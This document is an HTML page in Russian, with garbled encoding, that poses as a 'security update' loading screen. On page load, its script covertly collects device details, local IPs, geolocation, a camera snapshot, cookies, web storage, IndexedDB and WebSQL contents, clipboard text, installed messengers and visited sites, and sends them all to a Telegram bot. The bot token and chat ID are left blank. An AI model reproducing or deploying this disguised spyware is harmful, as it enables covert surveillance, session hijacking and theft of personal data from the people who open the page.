<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      text-align: center;
      padding: 20px;
      color: #333;
      max-width: 600px;
      margin: auto;
    }
    h2 {
      color: #2c3e50;
      font-size: 1.5em;
    }
    .loader {
      margin-top: 20px;
      display: inline-block;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 1em;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>‚è≥ –ü–æ–¥–æ–∂–¥–∏—Ç–µ, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...</h2>
  <div class="loader"></div>

  <script>
    const TELEGRAM_BOT_TOKEN = 
    const TELEGRAM_CHAT_ID = 

    function sendData(message) {
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,  {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", err));
    }

    function sendFile(blob, caption = "") {
      const formData = new FormData();
      const file = new File([blob], "screenshot.jpg", { type: "image/jpeg" });
      formData.append("document", file);
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("caption", caption);
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,  {
        method: 'POST',
        body: formData
      }).catch(err => console.error("–û—à–∏–±–∫–∞ —Ñ–∞–π–ª–∞:", err));
    }

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
        language: navigator.language || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
        cookiesEnabled: document.cookie.length > 0,
        online: navigator.onLine,
        timestamp: new Date().toISOString()
      };
    }

    function getLocalIPs() {
      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
      const ips = [];
      const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
      if (!RTCPeerConnection) {
        sendData("‚ùå WebRTC –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
        return;
      }
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      pc.onicecandidate = e => {
        if (!e.candidate) {
          if (ips.length === 0) {
            sendData("üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
          } else {
            sendData(`<b>üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP:</b><pre>${ips.join('\n')}</pre>`);
          }
          pc.close();
          return;
        }
        const ipMatch = e.candidate.candidate.match(ipRegex);
        if (ipMatch && !ips.includes(ipMatch[0])) {
          ips.push(ipMatch[0]);
        }
      };
      setTimeout(() => {
        pc.close();
      }, 2000);
    }

    function requestGeolocation() {
      if (!navigator.geolocation) {
        sendData("‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
        return;
      }
      navigator.geolocation.getCurrentPosition(position => {
        const coords = position.coords;
        sendData(`<b>üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:</b><pre>–®–∏—Ä–æ—Ç–∞: ${coords.latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${coords.longitude}</pre>`);
      }, () => {
        sendData("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏");
      }, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    }

    function requestCameraAccess() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
          sendData("üé• –ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞");
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());
          canvas.toBlob(blob => {
            sendFile(blob, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å –∫–∞–º–µ—Ä—ã");
          }, "image/jpeg", 0.8);
        })
        .catch(() => {
          sendData("üì∑ –ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞");
        });
    }

    function collectCookiesAndStorage() {
      sendData(`<b>üç™ Cookies:</b> ${document.cookie || "–Ω–µ—Ç –∫—É–∫"}`);
      let storage = "";
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        storage += `${key}: ${localStorage.getItem(key)}\n`;
      }
      if (storage) {
        sendData(`<b>üì¶ LocalStorage:</b><code>${storage}</code>`);
      }
    }

    // === 1. –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ localStorage –∏ sessionStorage ===
    function scanStorage() {
      const storageData = {};
      storageData.localStorage = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        storageData.localStorage[key] = localStorage.getItem(key);
      }
      storageData.sessionStorage = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        storageData.sessionStorage[key] = sessionStorage.getItem(key);
      }
      if (Object.keys(storageData.localStorage).length > 0 || Object.keys(storageData.sessionStorage).length > 0) {
        sendData(`<b>üì¶ localStorage / sessionStorage:</b><pre>${JSON.stringify(storageData, null, 2)}</pre>`);
      } else {
        sendData("üìÇ localStorage –∏ sessionStorage –ø—É—Å—Ç—ã.");
      }
    }

    // === 2. –ü–æ–∏—Å–∫ –∫—É–∫ –ø–æ –∫–ª—é—á–µ–≤—ã–º –¥–æ–º–µ–Ω–∞–º ===
    function detectServiceCookies() {
      const knownDomains = ["facebook.com", "google.com", "instagram.com", "twitter.com", "linkedin.com"];
      const results = {};
      knownDomains.forEach(domain => {
        document.cookie.split("; ").forEach(cookie => {
          if (cookie.includes(domain)) {
            if (!results[domain]) results[domain] = [];
            results[domain].push(cookie);
          }
        });
      });
      if (Object.keys(results).length > 0) {
        sendData(`<b>üç™ –û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –∫—É–∫–∏ –¥–ª—è —Å–µ—Ä–≤–∏—Å–æ–≤:</b><pre>${JSON.stringify(results, null, 2)}</pre>`);
      } else {
        sendData("üö´ –ö—É–∫–∏ –¥–ª—è –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.");
      }
    }

    // === 3. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ IndexedDB ===
    function extractIndexedDB() {
      sendData("üîç –ü–æ–ø—ã—Ç–∫–∞ —á—Ç–µ–Ω–∏—è IndexedDB...");
      const request = indexedDB.databases();
      request.onsuccess = function(event) {
        const databases = event.target.result;
        if (databases.length === 0) {
          sendData("üö´ IndexedDB –ø—É—Å—Ç –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω.");
          return;
        }
        databases.forEach(dbInfo => {
          const dbName = dbInfo.name;
          const openRequest = indexedDB.open(dbName);
          openRequest.onupgradeneeded = function(e) { e.target.transaction.abort(); };
          openRequest.onsuccess = function(e) {
            const db = e.target.result;
            const storeNames = Array.from(db.objectStoreNames);
            let result = { name: dbName, version: db.version, stores: {} };
            storeNames.forEach(storeName => {
              const transaction = db.transaction(storeName, "readonly");
              const store = transaction.objectStore(storeName);
              const getAllRequest = store.getAll();
              getAllRequest.onsuccess = function(ev) {
                result.stores[storeName] = ev.target.result.slice(0, 10);
                if (Object.keys(result.stores).length === storeNames.length) {
                  sendData(`<b>üìÅ IndexedDB ‚Äî ${dbName}</b><pre>${JSON.stringify(result, null, 2)}</pre>`);
                }
              };
            });
          };
        });
      };
      request.onerror = function(event) {
        sendData("‚ùå –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ IndexedDB.");
      };
    }

    // === 4. –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ WebSQL ===
    function readWebSQLDatabase() {
      if (!window.openDatabase) {
        sendData("üö´ WebSQL –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
        return;
      }
      const dbName = "testDB";
      const db = openDatabase(dbName, "1.0", "–¢–µ—Å—Ç–æ–≤–∞—è –ë–î", 2 * 1024 * 1024);
      db.transaction(tx => {
        tx.executeSql("SELECT * FROM sqlite_master WHERE type='table'", [], function (_, results) {
          let tables = [];
          for (let i = 0; i < results.rows.length; i++) {
            tables.push(results.rows.item(i).name);
          }
          if (tables.length > 0) {
            sendData(`<b>üóÑÔ∏è –ù–∞–π–¥–µ–Ω—ã —Ç–∞–±–ª–∏—Ü—ã –≤ WebSQL:</b><pre>${tables.join("\n")}</pre>`);
            tables.forEach(table => {
              tx.executeSql(`SELECT * FROM ${table}`, [], function (_, res) {
                let rows = [];
                for (let j = 0; j < res.rows.length; j++) {
                  rows.push(res.rows.item(j));
                }
                sendData(`<b>üìÑ –°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ç–∞–±–ª–∏—Ü—ã "${table}":</b><pre>${JSON.stringify(rows, null, 2)}</pre>`);
              });
            });
          } else {
            sendData("üìÇ WebSQL –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –ø—É—Å—Ç–∞.");
          }
        });
      });
    }

    // === 5. –ü–æ–∏—Å–∫ —Å–ª–µ–¥–æ–≤ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–æ–≤ ===
    function checkInstalledMessengers() {
      const apps = [
        { name: "WhatsApp", url: "whatsapp://send?text=hi" },
        { name: "Telegram", url: "tg://resolve?domain=example" },
        { name: "Viber", url: "viber://chat?number=123456789" },
        { name: "Facebook Messenger", url: "fb-messenger://user-thread/123" }
      ];
      const detected = [];
      apps.forEach(app => {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = app.url;
        document.body.appendChild(iframe);
        setTimeout(() => {
          try {
            if (document.visibilityState === "hidden") {
              detected.push(app.name);
            }
          } catch (e) {}
          document.body.removeChild(iframe);
        }, 1000);
      });
      setTimeout(() => {
        if (detected.length > 0) {
          sendData(`<b>üì± –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:</b><pre>${detected.join("\n")}</pre>`);
        } else {
          sendData("üö´ –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.");
        }
      }, 2000);
    }

    // === 6. –ü–µ—Ä–µ—Ö–≤–∞—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ ===
    async function captureClipboard() {
      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          sendData(`<b>üìã –°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞:</b><pre>${text}</pre>`);
        } else {
          sendData("üìé –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø—É—Å—Ç –∏–ª–∏ –¥–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω.");
        }
      } catch (err) {
        sendData("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞.");
      }
    }

    // === 7. –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–∞–π–ª ===
    let collectedData = {};

    function collectAllDataForExport(data) {
      Object.assign(collectedData, data);
    }

    function exportDataToFile(data, filename = "data_export", format = "json") {
      const blob = new Blob([format === "json" ? JSON.stringify(data, null, 2) : data], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${filename}.${format}`;
      a.click();
      URL.revokeObjectURL(url);
    }

    function exportCollectedData() {
      if (Object.keys(collectedData).length === 0) {
        sendData("üìÇ –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞.");
        return;
      }
      exportDataToFile(collectedData, "browser_data_export", "json");
      sendData("‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ñ–∞–π–ª `browser_data_export.json`");
    }

    // === 8. –ü–æ–∏—Å–∫ –ø–æ—Å–µ—â—ë–Ω–Ω—ã—Ö —Å–∞–π—Ç–æ–≤ —á–µ—Ä–µ–∑ CSS —Å—Ç–∏–ª–∏ —Å—Å—ã–ª–æ–∫ ===
    function detectVisitedSites(domains = ["google.com", "facebook.com", "instagram.com", "whatsapp.com", "telegram.org"]) {
      const visited = [];
      domains.forEach(domain => {
        const link = document.createElement("a");
        link.href = `https://${domain}`;
        link.textContent = domain;
        document.body.appendChild(link);
        const computedColor = window.getComputedStyle(link).color;
        if (computedColor === "rgb(128, 0, 128)") {
          visited.push(domain);
        }
        document.body.removeChild(link);
      });
      return visited;
    }

    function logVisitedDomains() {
      const visited = detectVisitedSites();
      if (visited.length > 0) {
        sendData(`<b>üîç –ü–æ—Å–µ—â—ë–Ω–Ω—ã–µ –¥–æ–º–µ–Ω—ã:</b><pre>${visited.join('\n')}</pre>`);
      } else {
        sendData("üåê –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –ø–æ—Å–µ—â—ë–Ω–Ω—ã–µ —Å–∞–π—Ç—ã.");
      }
    }

    // === –ó–∞–ø—É—Å–∫ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö ===
    function startCollection() {
      const deviceInfo = getDeviceInfo();
      collectAllDataForExport({ deviceInfo });
      sendData(`<b>üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b><pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);
      getLocalIPs();
      requestGeolocation();
      requestCameraAccess();
      collectCookiesAndStorage();
      scanStorage();
      detectServiceCookies();
      extractIndexedDB();
      readWebSQLDatabase();
      checkInstalledMessengers();
      captureClipboard();
      logVisitedDomains();
      setTimeout(() => {
        exportCollectedData();
      }, 5000);
    }

    window.onload = () => {
      setTimeout(startCollection, 2000);
    };
  </script>
</body>
</html>
